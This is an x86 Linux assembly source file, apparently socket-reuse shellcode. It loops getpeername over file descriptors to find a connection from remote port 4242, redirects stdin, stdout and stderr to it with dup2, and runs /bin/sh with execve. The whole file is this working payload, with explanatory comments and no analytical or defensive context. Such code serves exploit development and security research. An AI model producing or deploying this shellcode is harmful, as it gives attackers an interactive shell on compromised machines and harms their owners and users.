global _start

section .text
_start:
	xor ebx, ebx
	push ebx
	mov edi, esp			; save socket structure in the stack
	push byte +0x10			; 16 bytes in total
	push esp			; addrlen
	push edi			; addr
	push ebx			; sockfd
	mov ecx, esp			; args
	; int getpeername(int, struct sockaddr *, socklen_t *)
	mov bl, 0x7			; call

port_restart:
	inc dword [ecx]			; increment getpeername(2) descriptor
	push byte +0x66
	; int socketcall(int, unsigned long *)
	pop eax
	int 0x80

	cmp word [edi + 0x2], 0x9210	; compare remote port with 4242/tcp
	jnz port_restart		; remote port is different

	pop ebx				; pop the detected file descriptor value
	push byte +0x2			; start by redirecting stderr to it
	pop ecx
port_dup2_loop:
	mov al, 0x3f
	; int dup2(int, int)
	int 0x80
	dec ecx				; redirect stdout and stdin, too
	jns port_dup2_loop		; don't jump if ecx is positive

	push eax			; dup2(2) returned 0, push it
	push dword 0x68732f2f		; //sh
	push dword 0x6e69622f		; /bin
	mov ebx, esp			; filename
	push eax
	push ebx			; filename
	mov ecx, esp			; argv
	cdq				; set edx to zero as well
	mov al, 0xb
	; int execve(const char *, char *const [], char *const [])
	int 0x80
